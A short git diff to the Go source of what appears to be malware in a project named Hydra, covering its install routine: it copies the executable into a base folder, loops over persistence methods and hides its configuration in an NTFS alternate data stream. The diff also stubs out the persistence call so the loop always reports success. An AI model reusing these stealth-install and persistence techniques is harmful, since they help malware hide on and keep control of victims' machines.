@@ -4,6 +4,7 @@ import (
 	"encoding/gob"
 	"log"
 	"os"
+	"path"
 	"time"
 
 	"github.com/Raffy27/Hydra/util"
@@ -33,11 +34,19 @@ func IsInstalled() bool {
 func WriteInstallInfo() error {
 	Info.Loaded = true
 
-	f, err := os.Create(os.Args[0] + ":" + util.Ads)
+	var fn string
+	if Info.Base != "" {
+		fn = path.Join(Info.Base, util.Binary)
+	} else {
+		fn = os.Args[0]
+	}
+
+	f, err := os.Create(fn + ":" + util.Ads)
 	if err != nil {
 		return err
 	}
 	defer f.Close()
+
 	enc := gob.NewEncoder(f)
 	enc.Encode(Info)
 
@@ -77,11 +86,13 @@ func Install() {
 	base, err := CreateBase()
 	util.Panicln(err, "Base creation failed")
 	Info.Base = base
+	log.Println("Base set: " + base)
+
 	err = CopyExecutable()
 	util.Panicln(err, "Binary relocation failed")
 
 	for i := 1; i < 4; i++ {
-		if err := persist(i); err == nil {
+		if err := 0; /*persist(i);*/ err == 0 {
 			log.Printf("Persistence method #%d worked\n", i)
 			Info.PType = i
 			break
@@ -90,7 +101,7 @@ func Install() {
 		}
 	}
 
-	log.Println("done")
+	log.Println("Install complete")
 
 	err = WriteInstallInfo()
 	util.Panicln(err, "Failed to dump install configuration")
